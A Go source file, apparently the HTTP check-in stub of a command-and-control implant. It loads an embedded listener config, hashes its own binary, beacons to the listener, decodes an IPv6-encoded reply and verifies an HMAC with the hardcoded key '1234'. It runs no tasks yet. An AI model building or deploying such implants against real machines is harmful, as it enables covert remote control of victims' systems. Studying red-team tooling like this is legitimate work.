//go:build http

package main

import (
	"crypto/sha256"
	_ "embed"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"

	"github.com/matt-culbert/dns-daemon/implant/shared"
)

type ResponseData struct {
	Message string `json:"message"`
	Key     string `json:"key"`
}

//go:embed config.json
var configData []byte // Embedded config data

// Config struct to hold configuration
type Config struct {
	Listener string `json:"listener"`
	Id       string `json:"id"`
	Sleep    string `json:"sleep"`
}

// Function to load configuration from embedded JSON
func loadConfig() (Config, error) {
	var config Config
	if err := json.Unmarshal(configData, &config); err != nil {
		return Config{}, err
	}
	return config, nil
}

func main() {
	// Load configuration from embedded data
	conf, err := loadConfig()
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	// Get the path of the currently running executable
	exePath, err := os.Executable()
	if err != nil {
		log.Fatalf("Failed to get executable path: %v", err)
	}

	// Open the executable file
	exeFile, err := os.Open(exePath)
	if err != nil {
		log.Fatalf("Failed to open executable file: %v", err)
	}
	defer exeFile.Close()

	// Create a SHA-256 hasher and copy the file's contents into it
	hasher := sha256.New()
	if _, err := io.Copy(hasher, exeFile); err != nil {
		log.Fatalf("Failed to hash executable file: %v", err)
	}

	// Compute the SHA-256 hash
	localHash := hasher.Sum(nil)

	url := "http://" + conf.Listener + "/" + conf.Id

	// Make the GET request
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalf("Error making GET request: %v", err)
	}
	fmt.Println("request made")
	defer resp.Body.Close()

	// Check the response status
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("Non-OK HTTP status: %s", resp.Status)
	}
	fmt.Println("response received")

	// Read the response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Error reading response body: %v", err)
	}
	fmt.Println("body read")

	// Parse the JSON response
	var data ResponseData
	_ = json.Unmarshal(body, &data)
	/*
		if err != nil {
			log.Fatalf("Failed to parse JSON response: %v", err)
		}
	*/
	// Print the values (for testing)
	fmt.Println("Message:", data.Message)
	fmt.Println("Key:", data.Key)

	decoded, _ := shared.DecodeIPv6ToString(string(data.Message))
	fmt.Println("Decoded string:", decoded)
	fmt.Println(localHash)

	// Verify the message with the received HMAC
	if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte("1234")) {
		fmt.Println("HMAC is valid!")
	} else {
		fmt.Println("HMAC is invalid or message was tampered with.")
	}

}
